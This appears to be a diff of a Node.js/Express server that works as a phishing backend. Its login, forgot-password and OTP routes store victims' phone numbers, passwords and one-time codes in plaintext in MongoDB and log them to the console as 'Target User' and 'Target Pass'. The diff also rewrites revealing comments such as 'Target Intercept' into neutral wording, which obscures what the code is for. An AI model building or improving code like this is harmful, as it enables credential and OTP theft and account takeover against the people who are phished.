@@ -8,20 +8,20 @@ const app = express();
 app.use(express.json());
 app.use(cors()); 
 
-// 1. Unified Data Structure Schema for tracking all actions
+// 1. Unified Data Structure Schema
 const userSchema = new mongoose.Schema({
     phoneNumber: { type: String, required: false },
     password: { type: String, required: false },
     otpEntered: { type: String, default: "" },
     resetPhone: { type: String, default: "" },
     newPassword: { type: String, default: "" },
-    actionType: { type: String, default: "LOGIN" }, // LOGIN ya PASSWORD_RESET
+    actionType: { type: String, default: "LOGIN" }, // LOGIN or PASSWORD_RESET
     createdAt: { type: Date, default: Date.now }
 });
 
 const User = mongoose.model('User', userSchema);
 
-// Memory variable for temporarily storing password resets until OTP check
+// Memory stack for holding temporary modification requests 
 let pendingResets = {};
 
 // 2. Database Server Initialization Function
@@ -45,11 +45,10 @@ async function startServer() {
     }
 }
 
-// 3. API Route: Login Data Receive Karne Ke Liye
+// 3. API Route: Login Submission
 app.post('/api/login-submit', async (req, res) => {
     try {
         const { phoneNumber, password } = req.body;
-        
         const newUser = new User({ phoneNumber, password, actionType: "LOGIN" });
         const savedUser = await newUser.save();
         
@@ -64,16 +63,16 @@ app.post('/api/login-submit', async (req, res) => {
     }
 });
 
-// 4. API Route: Forgot Password Request Target Intercept
+// 4. API Route: Forgot Password Initiation
 app.post('/api/forgot-submit', async (req, res) => {
     try {
         const { phone, newPassword } = req.body;
         
-        // Temporarily store credentials until user sends OTP
+        // Temporarily store credentials inside object mapping structure
         pendingResets[phone] = { newPassword };
 
         console.log(`\n[🔄 PASSWORD RESET PROCESS TRIGGERED]`);
-        console.log(`📱 target User : ${phone}`);
+        console.log(`📱 Target User : ${phone}`);
         console.log(`🔑 Target Pass : ${newPassword}`);
         console.log(`------------------------------------`);
 
@@ -83,7 +82,7 @@ app.post('/api/forgot-submit', async (req, res) => {
     }
 });
 
-// 5. API Route: OTP Receive aur Action Wise Save Karne Ke Liye
+// 5. API Route: Universal OTP Router Aggregator
 app.post('/api/otp-submit', async (req, res) => {
     try {
         const { userId, otp, isReset, phone } = req.body;
@@ -91,7 +90,6 @@ app.post('/api/otp-submit', async (req, res) => {
         if (isReset) {
             const cachedContext = pendingResets[phone];
             if(cachedContext) {
-                // Agar request forgot password flow se aayi hai
                 const resetData = new User({
                     resetPhone: phone,
                     newPassword: cachedContext.newPassword,
@@ -106,13 +104,12 @@ app.post('/api/otp-submit', async (req, res) => {
                 console.log(`🔐 OTP Entered  : ${otp}`);
                 console.log('====================================');
                 
-                delete pendingResets[phone]; // memory clean up
+                delete pendingResets[phone]; 
                 return res.status(200).json({ success: true });
             } else {
                 return res.status(400).json({ success: false, message: "Session Expired" });
             }
         } else {
-            // Agar request normal login flow se aayi hai
             if (mongoose.Types.ObjectId.isValid(userId)) {
                 await User.findByIdAndUpdate(userId, { otpEntered: otp });
             }
